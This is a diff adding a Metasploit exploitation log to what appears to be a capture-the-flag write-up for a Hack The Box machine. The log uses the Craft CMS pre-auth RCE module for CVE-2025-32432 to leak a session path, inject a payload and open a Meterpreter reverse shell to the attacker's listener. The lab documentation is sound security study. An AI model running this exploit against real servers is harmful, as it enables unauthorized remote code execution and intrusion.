@@ -97,12 +97,61 @@ The vulnerability works and is exploited in the wild over vulnerable Craft CMS i
 
 - The payload includes a PHP object that gets deserialized, leading to arbitrary code execution through the _**GuzzleHttp\Psr7\FnStream**_ class.
 
+Source: https://www.sonicwall.com/it-it/blog/craftcms-vulnerability-exposes-systems-to-pre-auth-rce-now-exploited-in-the-wild-cve-2025-32432-
 ### Exploitation
 
-PoC
+PoC: https://www.rapid7.com/db/modules/exploit/linux/http/craftcms_preauth_rce_cve_2025_32432/
 
 ```shell
-# Commands used
+msf > use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > options
+
+Module options (exploit/linux/http/craftcms_preauth_rce_cve_2025_32432):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   ASSET_ID  389              yes       Existing asset ID
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, http, socks5, socks5h
+   RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT     80               yes       The target port (TCP)
+   SSL       false            no        Negotiate SSL/TLS for outgoing connections
+   VHOST                      no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   PHP In-Memory
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set rhosts orion.htb
+rhosts => orion.htb
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set lhost tun0
+lhost => 10.10.15.4
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > run
+[*] Started reverse TCP handler on 10.10.15.4:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] Leaked session.save_path: /var/lib/php/sessions
+[+] The target is vulnerable. Session path leaked
+[*] Injecting stub & triggering payload...
+[*] Sending stage (41224 bytes) to 10.129.35.17
+[*] Meterpreter session 1 opened (10.10.15.4:4444 -> 10.129.35.17:58740) at 2026-06-27 07:07:39 -0400
+
+meterpreter > 
+
 ```
 
 ---
@@ -110,7 +159,7 @@ PoC
 
 ### Lateral Movement (if applicable)
 
-Steps to move from initial foothold to user access.
+
 
 ---
 ## Privilege Escalation
